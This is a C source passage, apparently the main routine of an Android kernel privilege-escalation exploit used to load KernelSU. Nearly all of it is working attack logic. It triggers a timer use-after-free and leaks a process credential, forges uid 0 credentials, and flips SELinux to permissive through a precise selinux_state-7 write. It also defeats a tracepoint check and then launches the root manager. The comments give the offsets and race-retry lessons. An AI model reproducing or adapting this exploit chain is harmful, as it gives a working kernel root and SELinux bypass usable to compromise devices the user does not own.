                        if (!g_root_user_link)
                            g_root_user_link = xs->root_user;
                        if (!g_init_ucounts_link)
                            g_init_ucounts_link = xs->init_ucounts;
                        if (!g_init_groups_link)
                            g_init_groups_link = xs->init_groups;
                        break;
                    }
                }
            }
        }
        if (tab && (getenv("IC_FORCE_ANCHORS") ||
                    (argc > 1 && !strcmp(argv[1], "anchors"))))
        {
            char *atext = malloc(8u << 20);

            if (atext)
            {
                unsigned long long sl = slide_from_anchors(
                    tab, raw, 48u << 20, atext, 8u << 20);

                free(atext);
                if (sl)
                {
                    g_slide = sl;
                    g_tp_runtime = tab->link[IC_ANCHOR_N - 4] + sl;
                    g_selinux_runtime = tab->link[IC_ANCHOR_N - 3] + sl;
                    logf("[anchors] slide=%#llx tp=%#llx selinux=%#llx\n",
                         sl, g_tp_runtime, g_selinux_runtime);
                }
            }
        }
    }
    {
        /* The old tool's generated table (if the user pushed one) wins over
         * the built-in tables: it is the only source for builds we do not
         * ship, e.g. PD2425 / 16.1.17.10. */
        const char *sf = getenv("IC_SYMS_FILE");

        if (!sf || !*sf)
            sf = "/data/local/tmp/ic-syms.txt";
        {
            int sn = read_syms_file(sf);

            logf("[syms] %s -> %d (tp=%#llx selinux=%#llx)\n", sf, sn,
                 g_tp_link, g_selinux_link);
            logf("[syms] have ru=%#llx ns=%#llx uc=%#llx gi=%#llx cred=%#llx\n",
                 g_root_user_link, g_init_user_ns_link, g_init_ucounts_link,
                 g_init_groups_link, g_init_cred_link);
        }
    }

    if (argc > 2 && !strcmp(argv[1], "cpu"))
        g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    logf("[core] built %s %s\n", __DATE__, __TIME__);
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
    enable_events();
    kick_rss();
    usleep(50000);

    {
        int discovered = 0;

        for (int attempt = 1; attempt <= 3; attempt++)
        {
            logf("[+] page event discovery attempt=%d/3\n", attempt);
            if (discover_page_types(raw) == 0)
            {
                discovered = 1;
                break;
            }
            usleep(500000);
        }
        if (!discovered)
        {
            logf("[-] page event discovery failed; no UAF was triggered\n");
            return 1;
        }
    }
    if (ids_only)
        return 0;

    g_base = calibrate_base(raw);
    /* Offline check of the table path: pretend the profile does not match so
     * the derived slide + per-build TP table are exercised. */
    if (getenv("IC_FORCE_TABLE"))
        g_static_ok = 0;
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    if (g_fake_stage && !g_full_shell && !g_exec_payload &&
        write_ksu_script() != 0)
    {
        /* No usable stage script means no handoff.  Stop before the plants
         * touch anything, and release the blocked child the same way the
         * leak-only path does. */
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[-] stage script not usable; aborting before any plant\n");
        return 1;
    }
    ensure_pool();
    ensure_raw();

    if (!g_fake_stage)
    {
        struct plant_res r;
        int verified = 0, held0 = g_held;

        memset(&r, 0, sizeof(r));
        for (int a = 0; a < 8 && !verified; a++)
        {

            unsigned long uid = ~0UL;
            logf("[+] plant attempt %d/8\n", a + 1);
            memset(&r, 0, sizeof(r));
            run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
            if (!r.ok)
            {
                /* The plant held a zombie: releasing it would walk the
                 * corrupted timer tree, so stop instead of piling more on. */
                if (g_held > held0)
                    park_forever("plant held a zombie");
                continue;
            }
            if (!proc_real_uid(C, &uid) && uid == 0)
            {
                logf("[+] plant verified: child real uid=0\n");
                verified = 1;
                break;
            }
            logf("[!] plant reaped cleanly but write missed (uid=%lu)\n", uid);
        }
        if (!verified)
            park_forever("no verified plant");
        /* defeat_vr only writes __tracepoint_sys_exit.funcs (the task
         * argument is unused since the refactor), so a leaked task_struct is
         * NOT required: on builds whose copy_process call site differs from
         * the profile, task_recs is 0 while the timer site is still known. */
        if (g_static_ok || g_tp_runtime || (g_tp_link && g_slide))
        {
            if (defeat_vr(0, raw))
                park_forever("shell vr de-tag failed");
        }
        else
            logf("[-] shell vr de-tag skipped: no __tracepoint_sys_exit "
                 "address for this build\n");
    }
    else
    {
        struct plant_res fc;

        if (!g_static_ok &&
            !(g_selinux_link && g_root_user_link && g_init_user_ns_link &&
              g_init_ucounts_link && g_init_groups_link && g_tp_link))
        {
            /* The fake endgame needs the per-build selinux_state / init_*
             * / TP addresses.  Either the profile matches or an external
             * syms table supplies them (0.12.7+). */
            logf("[-] fake path needs per-build addresses; push a syms "
                 "table (ic-syms.txt) or run the shell path\n");
            close(go_fd);
            close(st_fd);
            kill(C, SIGKILL);
            waitpid(C, NULL, 0);
            return 1;
        }
        if (!g_child_task)
            park_forever("child task not leaked");

        /* SELinux must be Permissive before the child runs anything, and this
         * write is load-bearing -- skipping it was tried and does not work.
         *
         * The child carries the fabricated cred: uid 0, CAP_FULL_SET, and a
         * blob page we filled ourselves.  With SELinux Enforcing it still gets
         * EACCES on /sys/fs/selinux/enforce and its report never reaches the
         * parent (`child report missing (n=0)`), because the forged blob does
         * not land in selinux's slot of the stacked LSM blob.  Permissive is
         * what makes the child able to act at all.
         *
         * The plant also has to come first for a second reason: `g_slide` is
         * derived from the timer allocation site captured during a plant, and
         * defeat_vr() cannot compute the absolute address of
         * __tracepoint_sys_exit without it.
         *
         * THE OFFSET IS state-7, NOT state.  This is measured, not inherited
         * on faith.  rb_erase stores a pointer, so the primitive is an 8-byte
         * zero.  BTF gives the struct head as
         *
         *   +0x0 enforcing(_Bool)  +0x1 initialized(_Bool)  +0x2 policycap[8]
         *
         * Writing at +0 clears `enforcing` AND `initialized`, and
         * selinux_initialized() == false poisons everything: every
         * security_sid_to_context_core() fails ("called before initial
         * load_policy on unknown SID"), zygote aborts each app it forks with
         *
         *   JNI FatalError: selinux_android_setcontext(...) failed
         *
         * and system_server ends up with an empty registry -- `service list`
         * returns "Found 0 services", which from the outside reads as "the
         * KernelSU manager opens and closes itself".
         *
         * state-7 makes the same 8-byte window end exactly at `enforcing`, so
         * `initialized` and `policycap` survive.  The seven bytes at
         * [state-7, state) belong to whatever precedes the struct in .bss;
         * they are clobbered, and the measured cost is nothing observable --
         * the framework came up normally with zero aborts. */
        logf("[+] fake: set SELinux permissive before vr\n");
        g_rel_mode = 1;
        g_rel_static = (g_selinux_link ? g_selinux_link
                                       : SELINUX_STATE_STATIC) - 7;
        g_rel_off = 0;
        /* This plant is a pure race and misses often -- several consecutive
         * cold-boot attempts have been seen to miss it outright.  Every miss is
         * retryable (the target just exec'd before the stale node was
         * reclaimed), so a few more attempts are free.  If even those miss,
         * exit instead of parking: the caller starts a fresh process, which is
         * much faster than a human having to kill a stuck attempt. */
        if (stage_write_retry(0, 0, "selinux", raw, 8, NULL))
        {
            logf("[!] selinux write missed 8 times; exiting for a fresh attempt\n");
            return 1;
        }
        g_rel_mode = 0;
        logf("[+] SELinux permissive set; getenforce=%s\n", getenforce_now());
        logf("[+] waiting 10s before vr de-tag\n");
        sleep(10);

        if (defeat_vr(g_child_task, raw))
            park_forever("vr de-tag failed");
        memset(&fc, 0, sizeof(fc));
/*
 * The self-parent erase takes the RB_EMPTY_NODE WARN; this profile's
 * panic_on_warn is 0.  The sysctl is only readable after SELinux is
 * off, so the WARN cannot be gated before this plant.
 *
 * Point task->cred at the reclaimed page.  The fake cred starts at
 * the stale node address; rb_erase dirties uid/gid with the target,
 * so one zero write repairs them.
 */
{
    {
        /* The fake plant re-points task->cred at the reclaimed page.  A
         * clean reap does not prove that erase ran with our payload, and a
         * missed plant leaves the child on its original cred, so compare the
         * child's real uid with ours: once the pointer is replaced, uid is
         * the high half of V+0x78 (0xffffff80 on this VA layout), never the
         * caller's uid.  Retry until the swap is visible. */
        unsigned long self_uid = (unsigned long)getuid();
        int planted = 0;

        for (int a = 0; a < 8 && !planted; a++)
        {
            int rc = stage_write_retry(g_child_task + OFF_TASK_CRED, 2,
                                       "fake_cred", raw, 1, &fc);

            if (rc < 0)
                park_forever("fake cred write failed");
            if (rc > 0)
                continue;
            {
                int cuid = -1, ceuid = -1;

                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) &&
                    (unsigned long)cuid != self_uid)
                    planted = 1;
                else
                    logf("[!] fake cred plant missed (child uid=%d); retrying\n",
                         cuid);
            }
        }
        if (!planted)
        {
            /* No stale node is held by the retryable misses, so the blocked
             * child can be cleaned up. */
            logf("[!] fake cred retry exhausted without a plant; cleaning up\n");
            close(go_fd);
            close(st_fd);
            kill(C, SIGKILL);
            waitpid(C, NULL, 0);
            for (int i = 0; i < g_pool_n; i++)
            {
                close(g_pool[i][0]);
                close(g_pool[i][1]);
            }
            return 1;
        }
    }
}
        if (!g_slide)
            park_forever("no KASLR slide");
        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        /* The fake cred lives on the stale timer node itself, so its usage
         * and uid fields overlap rb_node.__rb_parent_color: the plant writes
         * V+0x78 there, which leaves uid holding the pointer's high half on a
         * build whose cred starts with a 4-byte usage (PD2571 starts with an
         * 8-byte one and its uid lands past the qword).  Zeroing uid+gid is
         * still enough, but a missed erase leaves uid = -128, so verify the
         * child's real uid and re-fire. */
        {
            int fixed = 0;

            for (int a = 0; a < 8 && !fixed; a++)
            {
                int cuid = -1, ceuid = -1;
                int rc = stage_write_retry(fc.A + CRED_UID_OFF, 0,
                                           "fake_uid", raw, 1, NULL);

                if (rc < 0)
                    park_forever("fake uid fix held a zombie");
                if (rc > 0)
                    continue;
                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) && cuid == 0)
                    fixed = 1;
                else
                    logf("[!] fake uid write missed (uid=%d); retrying\n", cuid);
            }
            if (!fixed)
                park_forever("fake uid fix failed");
            /* The fake node rb_left overlaps cred+0x10 (sgid/euid on a build with a
             * 4-byte usage), so euid still holds the high half of the target
             * pointer.  Zero it too, or the child wakes with a bogus effective uid. */
            for (int a = 0; a < 8; a++)
            {
                int cuid = -1, ceuid = -1;
                int rc = stage_write_retry(fc.A + CRED_UID_OFF + 0x10, 0,
                                           "fake_euid", raw, 1, NULL);

                if (rc < 0)
                    park_forever("fake euid fix held a zombie");
                if (rc > 0)
                    continue;
                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) && ceuid == 0)
                    break;
                if (a == 7)
                    park_forever("fake euid fix failed");
            }
        }
    }
    logf("[+] cred writes landed, waking child\n");

    if (write(go_fd, g_fake_stage ? "G" : "A", 1) != 1)
        logf("[!] child wake write failed\n");
    if (g_fake_stage)
    {
        /* G also produces one 8-byte peek reply; consume it, or it gets
         * glued in front of the child report and the magic check fails. */
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        int st[2];

        if (poll(&pf, 1, 2000) > 0)
            (void)read(st_fd, st, sizeof(st));
    }
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            /* rep.euid is the snapshot taken at wake, before setuid(0); the
             * post-setuid effective uid is rep.reuid.  Requiring rep.euid==0
             * made every successful shell run report failure. */
            if (rep.uid == 0 && rep.setuid_ret == 0 && rep.reuid == 0)
                g_root_ok = 1;
            else
                logf("[!] child did not reach root "
                     "(uid=%d euid=%d setuid=%d resuid=%d/%d/%d)\n",
                     rep.uid, rep.euid, rep.setuid_ret,
                     rep.ruid, rep.reuid, rep.rsuid);
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    if (g_held == 0)
        logf("[+] success condition met: all exploit plants were reclaimed\n");
    else
        logf("[!] failure condition: %d exploit plant(s) were not reclaimed; reboot required\n",
             g_held);
    /* diag shares the fake chain but its stage script only prints
     * diagnostics -- it loads no module.  Letting it fall into the handoff
     * would have the parent wait for a `kernelsu` this run never asked for.
     * It still falls through to the g_held check below. */
    if (g_fake_stage && !g_full_shell && !g_diag)
    {
        /* Hard gate: never touch the KernelSU manager unless the credential
         * switch actually landed.
         *
         * Observed failure mode: the child's first report read
         * `uid=2000 euid=2000 resuid=0/0/0` -- the cred pointers had been
         * rewritten but the uid field repair had not taken, so it was not
         * root.  The old code logged a warning and carried on: it ran the
         * stage script (which reported `ksu missing` and did nothing) and then
         * restarted the manager against a driver that was never loaded, which
         * from the outside reads as "KSU opens, says not installed, and closes
         * by itself".
         *
         * Nothing below is safe on a half-successful run: the stage script is
         * only meaningful after a real root child.  Bail out and let the caller
         * start a fresh attempt. */
        if (!g_root_ok)
        {
            logf("[!] root child did not reach uid 0; skipping KernelSU "
                 "handoff and manager patching entirely\n");
            return 1;
        }
        logf("[+] root confirmed (uid 0); starting KernelSU handoff\n");
        /* The stage script (driven by the root child) loads kernelsu.ko and
         * runs post-fs-data / services / boot-completed.  Wait for the module
         * to appear before touching the manager -- starting it against a
         * driver-less KSU is what produced "not installed". */
        {
            int mod_ok = 0;

            for (int i = 0; i < 120; i++)
            {
                FILE *f = fopen("/proc/modules", "r");
                char line[256];

                if (f)
                {
                    while (fgets(line, sizeof(line), f))
                        if (!strncmp(line, "kernelsu ", 9))
                        {
                            mod_ok = 1;
                            break;
                        }
                    fclose(f);
                }
                if (mod_ok)
                    break;
                usleep(500000);
            }
            if (!mod_ok)
            {
                logf("[!] kernelsu module never appeared; not starting the "
                     "manager\n");
                return 1;
            }
            logf("[+] kernelsu module resident; proceeding to manager\n");
        }

        /* The module being resident is not the same as the handoff being
         * complete: post-fs-data / services / boot-completed can still fail
         * (a mislabelled ksud, a permission problem under restored Enforcing)
         * and the manager would then start against an unconfigured driver.
         * The stage script publishes its own verdict on stdout; require it. */
        {
            int init_ok = 0;
            FILE *f = fopen("/data/local/tmp/ksud-init.log", "r");
            char line[512];

            if (f)
            {
                while (fgets(line, sizeof(line), f))
                    if (!strncmp(line, "__INIT_DONE__", 13))
                    {
                        init_ok = 1;
                        break;
                    }
                fclose(f);
            }
            /* In ksu mode the handoff is the App's ksu_handoff.sh, which
             * publishes its verdict on stdout (late-load rc + module
             * resident) instead of writing this stage log.  Requiring the
             * stage file there rejected a perfectly good handoff -- the
             * module was already resident when it fired. */
            if (!init_ok && !g_exec_payload)
            {
                logf("[!] ksud init stages did not complete; not starting the "
                     "manager\n");
                return 1;
            }
            logf("[+] ksud init stages %s; starting manager\n",
                 init_ok ? "complete" : "verified by the ksu payload");
        }

        /* No seccomp patching.  No manager patching of any kind.
         *
         * An earlier revision zeroed `thread_info.flags` and then
         * `seccomp.mode` on candidate tasks captured from zygote's forks, on
         * the theory that the manager needs TIF_SECCOMP clear before it can
         * talk to the driver.  That theory does not hold, and acting on it is
         * destructive:
         *
         *  - Unnecessary.  A manager process whose own /proc/<pid>/status
         *    still read `Seccomp: 2` connected fine (logcat showed
         *    `KsuService: getPackages: 674` and the UI rendered jailbreak
         *    mode).  The driver fd does not care.
         *  - Unprovable target.  ftrace kmem records carry the *parent* pid;
         *    there is no way to tell which fork is the manager, so the capture
         *    accepted several candidates and patched all of them.
         *  - Destructive.  Zeroing the whole flags word also clears TIF_32BIT
         *    and every other bit on a live task; that has been observed to
         *    panic the kernel during the capture itself.
         *
         * What the driver really needs is a manager started *after* the LKM is
         * live and configured: libksud opens the driver once and keeps the fd,
         * so an instance started earlier caches a dead handle and never
         * retries.  Everything the handoff needs is already done by this
         * point -- the root child drove ksud late-load, kernelsu.ko is
         * resident, the init stages ran -- so one clean start is all that is
         * left. */
        logf("[+] starting KSU manager after verified handoff\n");
        {
            /* The App knows which manager it actually handed off to.  On
             * SukiSU / ReSukiSU the launcher activity name is randomised, so
             * `am start -n <pkg>/.ui.MainActivity` only ever worked for
             * KernelSU.  IC_KSU_PKG carries the detected package; monkey
             * resolves the launcher without knowing the class name. */
            const char *env_pkg = getenv("IC_KSU_PKG");
            const char *pkg = (env_pkg && *env_pkg) ? env_pkg : KSU_PKG;
            char cmd[256];

            if (env_pkg && !strcmp(env_pkg, "-"))
            {
                logf("[+] manager launch left to the app (IC_KSU_PKG=-)\n");
                goto manager_done;
            }
            snprintf(cmd, sizeof cmd, "am force-stop %s 2>/dev/null", pkg);
            int stop_rc = system(cmd);

            usleep(500000);
            if (stop_rc != 0)
            {
                /* A manager that survived the stop keeps the dead driver fd
                 * it cached, so starting the activity again would just bring
                 * that instance forward and produce the "opens then closes"
                 * symptom. */
                logf("[!] am force-stop failed (rc=%d); not starting the "
                     "manager\n", stop_rc);
                return 1;
            }
            if (getenv("IC_KSU_PKG") && *getenv("IC_KSU_PKG"))
                snprintf(cmd, sizeof cmd,
                         "monkey -p %s -c android.intent.category.LAUNCHER 1 "
                         ">/dev/null 2>&1", pkg);
            else
                snprintf(cmd, sizeof cmd,
                         "am start -n %s/.ui.MainActivity >/dev/null 2>&1", pkg);
            if (system(cmd) != 0)
            {
                /* Do not report completion for a launch that did not happen:
                 * the runner keys its success on this exit status. */
                logf("[!] manager start failed (%s); handoff incomplete\n", pkg);
                return 1;
            }
manager_done:
            ;
        }
        logf("[+] fake chain complete; exiting (reboot still recommended to "
             "clear the boot-scoped driver state)\n");
        return 0;
    }
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    if (g_diag)
        logf("[+] diag run complete\n");
    logf("[+] done\n");
    return 0;
}
